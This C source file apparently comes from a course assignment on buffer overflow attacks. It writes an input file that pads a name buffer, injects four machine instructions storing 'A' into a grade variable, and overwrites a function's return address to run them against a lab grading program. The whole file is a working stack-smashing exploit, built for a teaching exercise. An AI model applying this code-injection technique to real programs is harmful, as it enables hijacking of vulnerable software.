/* Authors: Rohan Amin and Alex Luo 
   createdataA.c */
#include <stdio.h>
#include "miniassembler.h"

int main(void) {
   FILE *psFile;
   int i;
   unsigned int mov, adr, strb, branch;
   unsigned long movLocation; 
   psFile = fopen("dataA", "w");

   /* Puts names in buf array */ 
   fputs("Rohan Alex",psFile);

   /* Filler with null bytes up to machine language instruction */
   for (i = 0; i < 22; i++)
      putc('\0', psFile);

   /* Save MiniAssembler machine language instructions */ 
   mov = MiniAssembler_mov(0, 'A');
   adr = MiniAssembler_adr(1,0x420044,0x42007c) ;
   strb = MiniAssembler_strb(0, 1); 
   branch = MiniAssembler_b(0x400864,0x420084);

   /* Location of printf call after changing grade to A */ 
   movLocation = 0x420078;

   /* Machine language code fills buf array to store A in 
      grade and branch to these instructions */ 
   fwrite(&mov, sizeof(unsigned int), 1, psFile);
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&strb, sizeof(unsigned int), 1, psFile);
   fwrite(&branch, sizeof(unsigned int), 1, psFile);

   /* Overwrites getName return address to that of printf call */ 
   fwrite (&movLocation, sizeof(unsigned long), 1, psFile); 
   fclose(psFile);
   return 0; 

}
